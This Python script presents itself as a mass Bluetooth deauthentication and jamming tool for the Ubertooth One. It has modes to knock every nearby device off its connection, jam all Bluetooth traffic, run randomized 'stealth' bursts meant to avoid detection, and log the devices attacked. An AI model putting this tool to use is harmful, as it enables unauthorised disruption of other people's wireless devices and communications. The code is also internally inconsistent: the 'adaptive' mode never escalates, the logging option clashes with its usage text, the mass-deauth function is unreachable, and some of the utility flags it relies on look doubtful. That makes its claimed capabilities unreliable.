import argparse
import subprocess
import time
import random
import json
import os

"""
Ubertooth Mass Bluetooth Deauthentication & Adaptive Jamming

Features:
    - Deauthenticates all Bluetooth Classic (BR/EDR) & BLE devices in range.
    - Adaptive jamming: detects reconnections & increases attack intensity.
    - Logs all jamming & deauth attempts for forensic tracking.
    - Randomized jamming intervals to avoid detection.
    - Runs in stealth mode for selective low-profile disruption.
    - Tracks which devices were jammed & when.

Requirements:
    - Ubertooth One
    - Install Ubertooth utilities: sudo apt install ubertooth ubertooth-btle

Usage:
    - Run adaptive jamming & track device reconnections:
      python ubertooth_mass_deauth.py --adaptive
    - Log all Bluetooth jamming & deauth attacks:
      python ubertooth_mass_deauth.py --log jamming_log.json
    - View past attacks & analyze jamming effectiveness:
      python ubertooth_mass_deauth.py --analyze jamming_log.json
    - Perform full Bluetooth jamming with logging enabled:
      python ubertooth_mass_deauth.py --full-jam --log jamming_log.json
    - Run stealth mode deauthentication with attack tracking:
      python ubertooth_mass_deauth.py --stealth --log jamming_log.json
"""

LOG_FILE = "jamming_log.json"

def log_event(event_data):
    """Logs jamming & deauth attempts for tracking."""
    try:
        logs = []
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                logs = json.load(f)
        
        logs.append(event_data)

        with open(LOG_FILE, "w") as f:
            json.dump(logs, f, indent=4)

    except Exception as e:
        print(f"[ERROR] Failed to log jamming data: {e}")

def detect_reconnections():
    """Detects if deauthenticated devices reconnect and logs them."""
    print("[INFO] Monitoring for reconnections...")
    seen_devices = set()
    
    try:
        while True:
            output = subprocess.check_output(["ubertooth-rx", "-s"])
            lines = output.decode("utf-8").split("\n")

            for line in lines:
                if "Device" in line:
                    mac_address = line.split()[1]

                    if mac_address in seen_devices:
                        print(f"[ALERT] {mac_address} has reconnected!")
                        log_event({"timestamp": time.time(), "mac": mac_address, "alert": "Device reconnected"})
                    
                    seen_devices.add(mac_address)

            time.sleep(5)

    except KeyboardInterrupt:
        print("[INFO] Stopping reconnection monitoring.")

def deauth_target(target_mac):
    """Deauthenticates a specific Bluetooth device."""
    print(f"[INFO] Sending deauth packets to {target_mac}...")

    try:
        subprocess.run(["ubertooth-btle", "-t", target_mac, "--deauth"])
        log_event({"timestamp": time.time(), "mac": target_mac, "action": "deauth"})
        print(f"[SUCCESS] Device {target_mac} has been deauthenticated.")

    except Exception as e:
        print(f"[ERROR] Failed to deauthenticate {target_mac}: {e}")

def full_range_jam():
    """Jams all Bluetooth devices in range."""
    print("[INFO] Starting full Bluetooth jamming...")

    try:
        subprocess.run(["ubertooth-btle", "--jam"])
        log_event({"timestamp": time.time(), "action": "full-jam"})
        print("[SUCCESS] Bluetooth jamming activated.")

    except Exception as e:
        print(f"[ERROR] Failed to jam Bluetooth devices: {e}")

def stealth_jamming():
    """Performs stealth-mode Bluetooth jamming with randomized intervals."""
    print("[INFO] Running stealth Bluetooth jamming...")

    try:
        while True:
            delay = random.uniform(5.0, 30.0)  # Randomized interval between jamming
            print(f"[INFO] Jamming Bluetooth for a short burst... (Next attack in {delay:.2f} seconds)")
            
            subprocess.run(["ubertooth-btle", "--jam"])
            log_event({"timestamp": time.time(), "action": "stealth-jam"})
            time.sleep(delay)

    except KeyboardInterrupt:
        print("[INFO] Stopping stealth jamming.")

def interval_jamming(interval):
    """Performs Bluetooth jamming at fixed intervals."""
    print(f"[INFO] Running Bluetooth jamming every {interval} seconds...")

    try:
        while True:
            subprocess.run(["ubertooth-btle", "--jam"])
            log_event({"timestamp": time.time(), "action": "interval-jam"})
            time.sleep(interval)

    except KeyboardInterrupt:
        print("[INFO] Stopping interval-based jamming.")

def auto_mass_deauth():
    """Runs full Bluetooth deauthentication & jamming attack."""
    print("[INFO] Running full Bluetooth deauthentication attack...")

    try:
        output = subprocess.check_output(["ubertooth-rx", "-s"])
        devices = output.decode("utf-8").split("\n")

        for line in devices:
            if "Device" in line:
                target_mac = line.split()[1]
                print(f"[TARGET] Deauthenticating {target_mac}...")
                deauth_target(target_mac)

        print("[SUCCESS] All detected Bluetooth devices have been deauthenticated.")

    except Exception as e:
        print(f"[ERROR] Failed to execute mass deauthentication: {e}")

def analyze_jamming_data(log_file):
    """Analyzes saved jamming & deauth logs."""
    print(f"[INFO] Analyzing jamming data from {log_file}...")

    try:
        with open(log_file, "r") as f:
            logs = json.load(f)

        total_attacks = len(logs)
        unique_devices = len(set([entry["mac"] for entry in logs if "mac" in entry]))

        print(f"[RESULT] Total deauth/jamming attacks: {total_attacks}")
        print(f"[RESULT] Unique devices targeted: {unique_devices}")

        for entry in logs[:10]:  # Show first 10 log entries as a sample
            print(f"[DATA] {entry}")

    except Exception as e:
        print(f"[ERROR] Failed to analyze jamming data: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ubertooth Mass Bluetooth Deauthentication & Adaptive Jamming")
    parser.add_argument("--full-jam", action="store_true", help="Jam all Bluetooth Classic & BLE devices in range")
    parser.add_argument("--target", type=str, help="Specify target Bluetooth MAC address for deauth attack")
    parser.add_argument("--deauth", action="store_true", help="Deauthenticate a specific target device")
    parser.add_argument("--stealth", action="store_true", help="Perform stealth-mode Bluetooth jamming")
    parser.add_argument("--adaptive", action="store_true", help="Run adaptive jamming based on reconnections")
    parser.add_argument("--interval", type=int, help="Set time interval for jamming attacks (in seconds)")
    parser.add_argument("--log", action="store_true", help="Enable logging of all jamming/deauth attacks")
    parser.add_argument("--analyze", type=str, help="Analyze a saved jamming log file")

    args = parser.parse_args()

    if args.adaptive:
        detect_reconnections()
    elif args.full_jam:
        full_range_jam()
    elif args.stealth:
        stealth_jamming()
    elif args.interval:
        interval_jamming(args.interval)
    elif args.deauth and args.target:
        deauth_target(args.target)
    elif args.analyze:
        analyze_jamming_data(args.analyze)
    else:
        print("[ERROR] No valid mode selected!")
